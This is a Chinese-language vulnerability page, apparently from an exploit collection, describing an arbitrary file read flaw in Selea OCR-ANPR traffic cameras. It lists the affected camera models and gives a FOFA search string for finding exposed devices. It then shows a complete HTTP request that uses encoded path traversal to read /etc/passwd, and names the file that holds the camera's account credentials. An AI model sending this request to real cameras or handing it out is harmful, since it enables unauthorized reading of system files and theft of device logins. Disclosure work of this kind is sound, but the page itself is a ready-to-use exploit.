---
title: Selea OCR-ANPR摄像机 SeleaCamera 任意文件读取漏洞
date: 2021-09-23 23:55:51
tags: PeiQi文库
categories:
 - 网络设备漏洞
 - SELEA
---

# Selea OCR-ANPR摄像机 SeleaCamera 任意文件读取漏洞

## 漏洞描述

Selea OCR-ANPR摄像机 SeleaCamera 存在任意文件读取漏洞，攻击者通过构造特定的Url读取服务器的文件

## 漏洞影响

> [!NOTE]
>
> Selea Selea Targa IP OCR-ANPR Camera iZero
>
> Selea Selea Targa IP OCR-ANPR Camera Targa 512
>
> Selea Selea Targa IP OCR-ANPR Camera Targa 504
>
> Selea Selea Targa IP OCR-ANPR Camera Targa Semplice
>
> Selea Selea Targa IP OCR-ANPR Camera Targa 704 TKM
>
> Selea Selea Targa IP OCR-ANPR Camera Targa 805
>
> Selea Selea Targa IP OCR-ANPR Camera Targa 710 INOX
>
> Selea Selea Targa IP OCR-ANPR Camera Targa 750
>
> Selea Selea Targa IP OCR-ANPR Camera Targa 704 ILB

## FOFA

> [!NOTE]
>
> "selea_httpd"

## 漏洞复现

登录页面如下

![](/img/20210924015437292938.png)

发送如下请求包读取文件

```
GET /CFCARD/images/SeleaCamera/%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd HTTP/1.1
Host: 
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6
Connection: close
```

![](/img/20210924015437467107.png)

摄像头账号密码文件为 **mnt/data/auth/users.json**

![](/img/20210924015437733231.png)

## Goby & POC

![](/img/20210924015438252556.png)